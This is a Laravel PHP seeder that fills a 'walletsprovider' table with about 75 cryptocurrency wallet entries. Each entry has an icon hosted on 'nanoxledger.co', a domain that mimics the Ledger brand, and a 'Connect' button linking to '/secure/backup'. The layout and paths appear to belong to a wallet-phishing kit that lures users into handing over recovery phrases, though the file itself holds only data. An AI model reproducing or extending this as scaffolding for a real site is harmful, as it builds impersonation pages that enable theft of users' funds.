<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\DB;

class WalletProviderSeeder extends Seeder
{
    /**
     * Run the database seeds.
     *
     * @return void
     */
    public function run()
    {
        $walletsProvider = [
            [
                'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/trust-wallet-66f8777532931d9c09b633344981a6a9.png',
                'title' => 'Trust',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/lobstr.png',
                'title' => 'Lobstar',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/walletcon.webp',
                'title' => 'Wallet connect',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/atomic-4c02d2b33cf091fd83c7a49819394e41.png',
                'title' => 'Atomic',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png',
                'title' => 'Metamask',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png',
                'title' => 'Rainbow',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/download.jpeg',
                'title' => 'Money',
                'btn_full' => 'Coneect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/download(1).jpeg',
                'title' => 'Gnosis Safe Multisig',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/crypto-4cbeac57421fb3ca2573db2cf448169a.png',
                'title' => 'Crypto.com | DeFi Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/download.png',
                'title' => 'Pillar',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Anchor.png',
                'title' => 'Anchor',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/onto-983003d35fe32bf916f9eda381f138f7.png',
                'title' => 'ONTO',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/tokenpocket-57a4a886cc644e5237ac1558226154cb.png',
                'title' => 'TokenPocket',
                'btn_full' => 'Connect'
            ],
            [
                            'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png',
                'title' => 'MathWallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/bitpay-1573dd6c95eb38386f181048663590d0.jpg',
                'title' => 'Bitpay',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/maiar.png',
                'title' => 'Maiar',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png',
                'title' => 'Ledger Live',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/walleth-b60336f8dd9ea86285408cb4f96634d1.png',
                'title' => 'Walleth',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/authereum-32f3939207b77c1837547d5ed4f86110.png',
                'title' => 'Authereum',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/HuobiWallet.jpeg',
                'title' => 'Huobi Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Eidoo.png',
                'title' => 'Eidoo',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/mykey-7419df5270c0406c80cba19fa5165923.png',
                'title' => 'MYKEY',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/LoopringWallet.jpeg',
                'title' => 'Loopring Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/trustvault-9031a67f82293fc50ead978f936cfff3.png',
                'title' => 'TrustVault',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/coin98-c5b50adaceaf474e48ef1dad150d0829.png',
                'title' => 'Coin98',
                'btn_full' => 'Coneect'
            ],
            [
                    'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png',
                'title' => 'CoolWallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Alice.png',
                'title' => 'Alice Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/AlphaWallet.jpeg',
                'title' => 'AlphaWallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png',
                'title' => 'D\'CENT Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png',
                'title' => 'ZelCore Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Nash.jpeg',
                'title' => 'Nash Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg',
                'title' => 'Coinomi',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png',
                'title' => 'GridPlus',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/CYBAVOWallet.png',
                'title' => 'CYBAVO Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Tokenary.png',
                'title' => 'Tokenary',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Wazirx.png',
                'title' => 'Wazirx',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Torus.jpeg',
                'title' => 'Torus',
                'btn_full' => 'Connect'
            ],
            [
                    'wallet_href' => '/secure/backup#cmpltadminModal-7',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Spatium.jpeg',
                'title' => 'Spatium',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/SafePal.png',
                'title' => 'SafePal',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Equal.jpeg',
                'title' => 'Equal',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Infinite.png',
                'title' => 'Infinite',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/wallet.io.png',
                'title' => 'wallet.io',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Infinity%20Wallet.png',
                'title' => 'infinity wallet',
                'btn_full' => 'Coneect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Ownbit.png',
                'title' => 'Ownbit',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/EasyPocket.jpg',
                'title' => 'EasyPocket',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/BridgeWallet.png',
                'title' => 'Bridge Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/SparkPoint.png',
                'title' => 'SparkPoint',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/ViaWallet.png',
                'title' => 'Via Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/BitKeep.png',
                'title' => 'BitKeep',
                'btn_full' => 'Connect'
            ],
            [
                    'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Vision.png',
                'title' => 'Vision',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/SWFTWallet.png',
                'title' => 'SWFT Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/PEAKDEFI.png',
                'title' => 'PEAKDEFI Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Cosmostation.png',
                'title' => 'Cosmostation',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/GraphProtocol.jpg',
                'title' => 'Graph Protocol',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/KardiaChain.png',
                'title' => 'KardiaChain',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Keplr.png',
                'title' => 'Keplr',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Harmony.png',
                'title' => 'Harmony',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/ICONex.png',
                'title' => 'ICONex',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/fetch.jpg',
                'title' => 'Fetch',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/XDCWallet.png',
                'title' => 'XDC Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Unstoppable%20Wallet.png',
                'title' => 'Unstoppable Wallet',
                'btn_full' => 'Connect'
            ],
            [
                    'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/MEETONE.jpg',
                'title' => 'MEET. ONE',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/DockWallet.png',
                'title' => 'Dock Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/ATWallet.png',
                'title' => 'AT. Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/MoriXWallet.png',
                'title' => 'MoriX Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Midas%20Wallet.png',
                'title' => 'Midas Wallet',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Ellipal.png',
                'title' => 'Ellipal',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/KEYRING%20PRO.png',
                'title' => 'KEYRING PRO',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Blockchain.png',
                'title' => 'Blockchain',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Binance%20Smart%20Chain.png',
                'title' => 'Binance Smart Chain',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/aktionariat-c5784b26234a389632687a36d2fb3258.png',
                'title' => 'Aktionariat',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Coinbase.png',
                'title' => 'Coinbase',
                'btn_full' => 'Connect'
            ],
            [
                'wallet_href' => '/secure/backup#',
                'trans_img_src' => 'https://nanoxledger.co/secure/images/icons/Exodus.png',
                'title' => 'Exodus',
                'btn_full' => 'Connect'
            ]
        ];

        DB::table('walletsprovider')->insert($walletsProvider   );
    }
}
